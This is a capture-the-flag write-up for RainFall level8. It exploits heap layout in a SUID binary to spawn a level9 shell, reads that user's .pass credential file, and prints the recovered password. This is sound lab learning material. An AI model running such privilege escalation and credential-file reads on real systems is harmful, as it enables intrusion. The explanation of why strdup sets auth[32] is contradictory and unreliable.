We get in the level8, then we list the files in the home directory:

```
    level8@RainFall:~$ ls -la
    -rwsr-s---+ 1 level9 users  6057 Mar  6  2016 level8
```
The binary is owned by level9 and has the SUID bit set, meaning if it executes any shell, it will run with level9's privileges.

We try to execute the binary file to get an idea of what it does exactly
```
    level8@RainFall:~$ ./level8 
    (nil), (nil) 
    auth sdasdas
    0x804a008, (nil) 
    auth asdas
    0x804a018, (nil) 
    service
    0x804a018, 0x804a028 
```

We decompile the binary to get the source code:

```
    if (strncmp(buf, "auth ", 5) == 0)
    {
        auth = (char*)malloc(4);
        *auth = 0;

        char* input = buf + 5;
        if (strlen(input) <= 30)
        {
            strcpy(auth, input);
        }
    }

```
The auth alocate 4 bytes

```
    if (strncmp(buf, "service", 7) == 0)
    {
        char temp[121];
        strncpy(temp, buf + 8, sizeof(temp) - 1);
        temp[sizeof(temp) - 1] = '\0';

        service = strdup(temp);
    }
```

Our goal is to make auth[32] != 0

The service allocates memory by strdup just after auth 

Since the heap is contiguous, the allocation for service happens immediately after auth.

So if we overflow auth into service, then calling strdup() writes a \0 at the end of its copy potentially writing into auth[32]

then we can satisfy the condition of login and spawn a shell

```
    if (strncmp(buf, "login", 5) == 0)
    { 
        if (auth != nullptr && auth[32] != 0)
        {
            system("/bin/sh");
        }
        else 
        {
            std::cout << "Password:\n";
        }
    }
```



```
    level8@RainFall:~$ ./level8
    (nil), (nil) 
    auth hh
    0x804a008, (nil) 
    service ahgdbghbnjkjhyt
    0x804a008, 0x804a018 
    login
    $ cat /home/user/level9/.pass 
    c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

we move to next level

```
    level8@RainFall:~$ su level9
    Password:c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
    No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level9/level9
    level9@RainFall:~$ 
```